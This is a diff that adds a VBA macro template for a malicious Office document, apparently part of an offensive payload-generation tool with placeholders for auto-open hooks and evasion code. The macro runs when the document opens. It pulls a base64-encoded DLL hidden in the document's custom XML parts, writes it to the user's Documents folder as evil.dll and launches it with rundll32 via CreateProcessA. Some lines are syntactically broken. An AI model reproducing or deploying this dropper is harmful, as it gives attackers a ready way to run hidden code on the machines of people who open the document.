@@ -1,0 +1,163 @@
+
+Option Explicit
+
+Private Type STARTUPINFO
+    cb As Long                  'DWORD  cb;
+    lpReserved As String        'LPSTR  lpReserved;
+    lpDesktop As String         'LPSTR  lpDesktop;
+    lpTitle As String           'LPSTR  lpTitle;
+    dwX As Long                 'DWORD  dwX;
+    dwY As Long                 'DWORD  dwY;
+    dwXSize As Long             'DWORD  dwXSize;
+    dwYSize As Long             'DWORD  dwYSize;
+    dwXCountChars As Long       'DWORD  dwXCountChars;
+    dwYCountChars As Long       'DWORD  dwYCountChars;
+    dwFillAttribute As Long     'DWORD  dwFillAttribute;
+    dwFlags As Long             'DWORD  dwFlags;
+    wShowWindow As Integer      'WORD   wShowWindow;
+    cbReserved2 As Integer      'WORD   cbReserved2;
+    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
+    hStdInput As LongPtr        'HANDLE hStdInput;
+    hStdOutput As LongPtr       'HANDLE hStdOutput;
+    hStdError As LongPtr        'HANDLE hStdError;
+End Type
+
+' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
+Private Type PROCESS_INFORMATION
+    hProcess As LongPtr     'HANDLE hProcess;
+    hThread As LongPtr      'HANDLE hThread;
+    dwProcessId As Long     'DWORD  dwProcessId;
+    dwThreadId As Long      'DWORD  dwThreadId;
+End Type
+
+#If Win64 Then
+    Private Declare PtrSafe Function Create Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#Else
+    Private Declare Function Create Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#End If
+
+
+//####DEFINE####
+
+Sub ####VBA_AUTO_OPEN####()
+    Run
+End Sub
+
+Sub ####VBA_FILE_OPEN####()
+    Run
+End Sub
+
+Sub Run()
+    //####EVASION####
+    Dim root As String
+    Dim path As String
+    Dim exe As String
+    Dim startInfo As STARTUPINFO
+    Dim procInfo As PROCESS_INFORMATION
+    Dim res As Long
+
+
+    path = Environ("USERPROFILE") & "\Documents\evil.dll"   
+    Drop(path)
+    Dim exists As String
+    Dim hReq As Object
+
+
+    #If Win64 Then
+        root = "C:\Windows\System32\"
+    #Else
+        root = "C:\Windows\SysWOW64\"
+    #End If
+
+    exe = root & "rundll32.exe " & Path & ",EntryPoint"
+    res = Create(vbNullString, exe, &0, &0, False, &0, &0, vbNullString, startInfo, procInfo)
+End Sub
+
+Sub Drop(ByVal Path As String)
+    Dim decoded, objFSO, objFile
+    decoded = B64(GetCustomPart("####VBA_REQUIRED_CUSTOM_PART####"))
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.CreateTextFile(Path, True)
+    objFile.Write decoded
+    objFile.Close
+End Sub
+
+Sub Send(ByVal hReq As Object, ByVal url As String)
+    With hReq
+        .Open "GET", url, False
+        .Send
+    End With
+End Sub
+
+Function GetCustomXMLPart(ByVal Name As String) As Object
+    Dim part
+    Dim parts
+    
+    On Error Resume Next
+    Set parts = ActiveDocument.CustomXMLParts
+    
+    For Each part In parts
+        If part.SelectSingleNode("/*").BaseName = Name Then
+            Set GetCustomXMLPart = part
+            Exit Function
+        End If
+    Next
+        
+    Set GetCustomXMLPart = Nothing
+End Function
+
+Function GetCustomXMLPartTextSingle(ByVal Name As String) As String
+    Dim part
+    Dim out, m, n
+    
+    Set part = GetCustomXMLPart(Name)
+    If part Is Nothing Then
+        GetCustomXMLPartTextSingle = ""
+    Else
+        out = part.DocumentElement.Text
+        n = Len(out) - 2 * Len(Name) - 5
+        m = Len(Name) + 3
+        If Mid(out, 1, 1) = "<" And Mid(out, Len(out), 1) = ">" And Mid(out, m - 1, 1) = ">" Then
+            out = Mid(out, m, n)
+        End If
+        GetCustomXMLPartTextSingle = out
+    End If
+End Function
+
+Function GetCustomPart(ByVal Name As String) As String
+    On Error GoTo ProcError
+    Dim tmp, j
+    Dim part
+    j = 0
+    
+    Set part = GetCustomXMLPart(Name & "_" & j)
+    While Not part Is Nothing
+        tmp = tmp & GetCustomXMLPartTextSingle(Name & "_" & j)
+        j = j + 1
+        Set part = GetCustomXMLPart(Name & "_" & j)
+    Wend
+    
+    If Len(tmp) = 0 Then
+        tmp = GetCustomXMLPartTextSingle(Name)
+    End If
+    
+    GetCustomPart = tmp
+    
+ProcError:
+End Function
+
+Function B64(ByVal data As String) As Byte()
+    Dim objXML2 As Object
+    Dim objNode As Object
+
+    Set objXML2 = CreateObject("MSXML2.DOMDocument")
+    Set objNode = objXML2.createElement("b64")
+    objNode.DataType = "bin.base64"
+    objNode.Text = data
+    B64 = StrConv(objNode.nodeTypedValue, vbUnicode)
+    Set objNode = Nothing
+    Set objXML2 = Nothing
+End Function
+
+
+//####CODE####
